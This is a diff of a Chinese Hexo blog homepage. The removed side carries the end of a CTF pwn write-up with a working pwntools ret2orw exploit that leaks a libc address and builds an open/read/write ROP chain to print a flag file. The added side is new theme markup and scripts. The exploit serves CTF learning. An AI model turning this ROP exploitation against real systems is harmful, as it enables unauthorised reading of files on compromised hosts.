-<h5 id="遇过一次坑就是，当把flag字符写进bss时，字符串应该时p-sendline-‘-flag-x00’-后面必须是空格，否则open函数是以加了-n来找flag文件，是找不到的，所以得加空格"><a href="#遇过一次坑就是，当把flag字符写进bss时，字符串应该时p-sendline-‘-flag-x00’-后面必须是空格，否则open函数是以加了-n来找flag文件，是找不到的，所以得加空格" class="headerlink" title="遇过一次坑就是，当把flag字符写进bss时，字符串应该时p.sendline(‘./flag\x00’),后面必须是空格，否则open函数是以加了\n来找flag文件，是找不到的，所以得加空格"></a>遇过一次坑就是，当把flag字符写进bss时，字符串应该时p.sendline(‘./flag\x00’),后面必须是空格，否则open函数是以加了\n来找flag文件，是找不到的，所以得加空格</h5><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241116201052197.png" alt="image-20241116201052197"></p>
-<p>常用的exp</p>
-<pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;27.25.151.12&quot;,33424)
-p=process(&quot;./ret2orw&quot;)
-elf=ELF(&#39;ret2orw&#39;)
-#libc=ELF(&#39;libc.so.6&#39;)
-libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
-context.log_level=&quot;debug&quot;
-
-pop_rdi=0x4012CE
-payload=b&#39;a&#39;*0x28+p64(pop_rdi)+p64(elf.got[&#39;puts&#39;])+p64(elf.plt[&#39;puts&#39;])+p64(0x4012A1)
-
-
-#sleep(1)
-
-p.sendlineafter(&#39;this?&#39;,payload)
-puts=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
-print(hex(puts))
-base=puts-libc.sym[&#39;puts&#39;]
-def dbg():
-    gdb.attach(p)
-    pause()
-pop_rsi=base+0x2be51
-pop_rdx=base+0x11f497
-bss=0x404060
-
-read=base+libc.sym[&#39;read&#39;]
-write=base+libc.sym[&#39;write&#39;]
-op=base+libc.sym[&#39;open&#39;]
-print(&#39;read&#39;+hex(read))
-payload=b&#39;a&#39;*0x28+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(0)+p64(read)+p64(0x4012A1)
-p.sendline(payload)
-p.sendline(&#39;./flag&#39;)
-dbg()
-payload=b&#39;a&#39;*0x28+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(op)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x300)+p64(pop_rdx)+p64(60)+p64(0)+p64(read)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x300)+p64(pop_rdx)+p64(60)+p64(0)+p64(write)
-p.sendline(payload)
-
-print(&#39;pop_rsi&#39;+hex(pop_rsi))
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/11/13/沙箱/沙箱/"> Read more -->
-          </span>
-        </div>
-
-        
+  <title>我的技术与生活——小站首页 | lonely is alwals</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——小站首页`
+  </script>
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
       </div>
-      
-
-
-      <div id="recent-posts-paginator">
-        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/2/"> </a>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
       </div>
-
     </div>
-
-<aside id="sidebar">
-  
-  <div class="widget-box">
-  	  <div class="widget-box">
-    <h3 class="widget-title-friends">friends</h3>
-    <div class="widget">
-      
-        <a class="friends-list-link" style="display: block;" href="https://fireworks99.github.io/" title target='_blank'
-        >fireworks99</a>
-      
-    </div>
-  </div>
-
-  </div>
-  
-  <div class="widget-box">
-  	
-
-  </div>
-  
-  <div class="widget-box">
-  	
-  <div class="widget-box">
-    <h3 class="widget-title-tag">tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-NewSar/" rel="tag">ctf-NewSar</a></li></ul>
-    </div>
-  </div>
-
-
-  </div>
-  
-  <div class="widget-box">
-  	
-  <div class="widget-box">
-    <h3 class="widget-title-archive">archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
-    </div>
-  </div>
-
-  </div>
-  
-  <div class="widget-box">
-  	
-  <div class="widget-box">
-    <h3 class="widget-title-post">recent_posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/26/FUZZ/xpdf/">xpdf</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/20/trick/">trick</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/20/trick/trick/">trick</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/18/qwnt2024/">qwnt2024</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/11/13/%E6%B2%99%E7%AE%B1/%E6%B2%99%E7%AE%B1/">沙箱</a>
-          </li>
-        
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://github.com/degial/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
       </ul>
     </div>
   </div>
+</header>
 
-  </div>
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"ACTF_2019_OneRepeater","path":"/posts/319d974/"},{"title":"ACTF_2019_message","path":"/posts/f5d1b033/"},{"title":"GUESS","path":"/posts/c587cd26/"},{"title":"NewStar","path":"/posts/d23e595a/"},{"title":"SWPUCTF_2019_p1KkHeap","path":"/posts/a25249b0/"},{"title":"SWPUCTF_2019_login","path":"/posts/61db3fed/"},{"title":"b00ks","path":"/posts/be955ceb/"},{"title":"b0verfl0w","path":"/posts/b656e51/"},{"title":"bad","path":"/posts/822b39fb/"},{"title":"babyheap_0ctf_2017","path":"/posts/1a2f921f/"},{"title":"bbctf_2020_write","path":"/posts/75171fcc/"},{"title":"ciscn_2019_c_3","path":"/posts/7d6af77/"},{"title":"ciscn_2019_c_5","path":"/posts/eeb50a42/"},{"title":"ciscn_2019_es_1","path":"/posts/90ce1974/"},{"title":"checkin","path":"/posts/e1631c91/"},{"title":"ciscn_2019_es_7","path":"/posts/79adbc41/"},{"title":"ciscn_final_2","path":"/posts/9a3dca0e/"},{"title":"ciscn_pwn","path":"/posts/344ab8fb/"},{"title":"ciscn_final_5","path":"/posts/4595fad/"},{"title":"easyshell","path":"/posts/9ea1a33f/"},{"title":"freenote_x64","path":"/posts/231495d9/"},{"title":"glibc","path":"/posts/58b6dd93/"},{"title":"gostack","path":"/posts/ad559ced/"},{"title":"heap","path":"/posts/bd2922e1/"},{"title":"hitcon2014_stkof","path":"/posts/78860fdf/"},{"title":"200~house_of_force","path":"/posts/a8db7475/"},{"title":"inndy_rop","path":"/posts/19fdcc0c/"},{"title":"","path":"/posts/0/"},{"title":"jiandan_pwn1","path":"/posts/595198b9/"},{"title":"heapcreator","path":"/posts/707c38cf/"},{"title":"lctf2016_pwn200","path":"/posts/6f5f7bb7/"},{"title":"level4","path":"/posts/7792b02a/"},{"title":"login","path":"/posts/aa08cb10/"},{"title":"mergeheap","path":"/posts/709727a2/"},{"title":"metasequoia_2020_samsara","path":"/posts/dff3306c/"},{"title":"note2","path":"/posts/c0d78a/"},{"title":"","path":"/posts/0/"},{"title":"python课设","path":"/posts/5eca8ee9/"},{"title":"overlapping_chunks","path":"/posts/37a70f1c/"},{"title":"qwnt2024","path":"/posts/a036fd99/"},{"title":"roarctf_2019_easypwn","path":"/posts/29aca647/"},{"title":"sctf2019_easy_heap","path":"/posts/b5a0cf5/"},{"title":"sctf_2019_easy_heap","path":"/posts/afe33925/"},{"title":"sleepyHolder_hitcon_2016","path":"/posts/b1e92899/"},{"title":"starctf_2019_girlfriend","path":"/posts/2672e039/"},{"title":"STKOF","path":"/posts/696f0fbd/"},{"title":"trick","path":"/posts/d8f0a91e/"},{"title":"stdout","path":"/posts/c2c94c1c/"},{"title":"","path":"/posts/0/"},{"title":"武功论剑","path":"/posts/6ca732a0/"},{"title":"解决libc6软件包和libc6-dev不匹配的问题","path":"/posts/24332419/"},{"title":"xpdf","path":"/posts/7e7e55f1/"},{"title":"CVE-2020-8423","path":"/posts/24932e9/"},{"title":"trick","path":"/posts/d8f0a91e/"},{"title":"沙箱","path":"/posts/fbdf783e/"},{"title":"","path":"/posts/0/"},{"title":"pstack","path":"/posts/3d6a2015/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">Cola.</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">中二</span>
+          <span class="main-left--tag">宅</span>
+        </div>
+      </div>
+    </div>
   
-</aside>
+    <div>
+      <div class="main-left--motto">
+        <p>“花有重开日，人无再少年”</p>
+        <p>“一个简单普通的男孩”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a href="https://github.com/Aizener"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>2</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>12 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
 
-<!-- <div id="paginator"> -->
-<!--   <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/2/"> </a> -->
-<!-- </div> -->
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-          tex2jax: {
-            inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-            processEscapes: true
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>57 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1033天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container"><link rel="stylesheet" href="/css/partial/index.css" />
+
+
+
+<div class="index">
+  <div class="index-left">
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="CVE-2020-8423" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/24932e9/">CVE-2020-8423 </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="trick" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/d8f0a91e/">trick </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="qwnt2024" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/a036fd99/">qwnt2024 </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+  </div>
+  <div class="index-center">
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" data-cover="" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="xpdf" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/7e7e55f1/">xpdf </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+      <div class="index-article">
+        <!-- <img class="index-article--cover" data-cover="" src="/imgs/default-cover.webp" alt=""> -->
+        <div class="index-article--box">
+          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="trick" />
+        </div>
+        <div class="index-article--content">
+          <a href="/posts/d8f0a91e/">trick </a>
+          <div>
+            
+            
+          </div>
+          <div class="bg"></div>
+        </div>
+      </div>
+    
+  </div>
+  <div class="index-right">
+    <div class="index-right-wrapper">
+      
+      <ul class="tags" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-NewSar/" rel="tag">ctf-NewSar</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">2024年11月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">2024年10月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">2024年09月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">2024年07月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">2024年05月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">2024年04月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">2024年03月</a><span class="archive-list-count">20</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">2024年02月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">2024年01月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">2023年12月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">2023年11月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">2023年10月</a><span class="archive-list-count">7</span></li></ul>
+    </div>
+  </div>
+</div>
+
+  <div class="page">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/2/">&gt;</a>
+  </div>
+
+
+<script>
+  var allImgBoxs = document.querySelectorAll('.index-article--box');
+  var windowHeight = window.innerHeight;
+  var boxs = Array.from(allImgBoxs);
+  var timer = null;
+  boxs.forEach((box, idx) => {
+    if (!window.loadImageSet || !window.loadImageSet.includes(idx)) {
+      box.classList.add('img-loading');
+    } else {
+      const imgDom = box.querySelector('img');
+      imgDom.src = imgDom.dataset.cover;
+    }
+  });
+
+  function scrollFn() {
+    if (timer) {
+      return;
+    }
+    timer = setTimeout(() => {
+      loadImage();
+      timer = null;
+    }, 100)
+  }
+
+  setTimeout(() => {
+    loadImage();
+  }, 100);
+  if (!window.loadedImage) {
+    document.addEventListener('scroll', scrollFn);
+  }
+
+  function loadImage() {
+    const doc = document.documentElement;
+    const scrollTop = doc.scrollTop;
+    if (boxs.every(box => box.loadedImage)) {
+      document.removeEventListener('scroll', scrollFn);
+      window.loadedImage = 1;
+      return;
+    }
+    boxs.forEach((box, idx) => {
+      if (box.loadedImage) {
+        return;
+      }
+      if (box.getBoundingClientRect().top < windowHeight) {
+        const imgDom = box.querySelector('img');
+        imgDom.src = imgDom.dataset.cover;
+        // 图片成功加载
+        imgDom.onload = () => {
+          box.classList.remove('img-loading');
+          box.loadedImage = true;
+          if (!window.loadImageSet) {
+            window.loadImageSet = [];
           }
-        });
-      </script>
+          window.loadImageSet.push(idx);
+        }
+        // 图片加载失败
+        imgDom.onerror = () => {
+          box.classList.remove('img-loading');
+          box.classList.add('img-error');
+          imgDom.src = '/imgs/404.png';
+        }
+      }
+    });
+  }
+</script> </div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~大噶好。唔系可乐爱宅着，欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-            tex2jax: {
-              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-            }
-          });
-      </script>
+  <div id="aplayer" class="main-right--music"></div>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-              var all = MathJax.Hub.getAllJax(), i;
-              for(i=0; i < all.length; i += 1) {
-                  all[i].SourceElement().parentNode.className += ' has-jax';
-              }
-          });
-    </script>
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
 
-    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"安河桥","artist":"宋冬野","url":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3","cover":"https://img2.baidu.com/it/u=1260056724,1076343118&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"},{"name":"卡布达","artist":"暂无","url":"music/kabuda.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
 
 
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
 
-			</div>
-		</div>
-
-		<div id="bottom-outer">
-			<div id="bottom-inner">
-				Site by your name | 
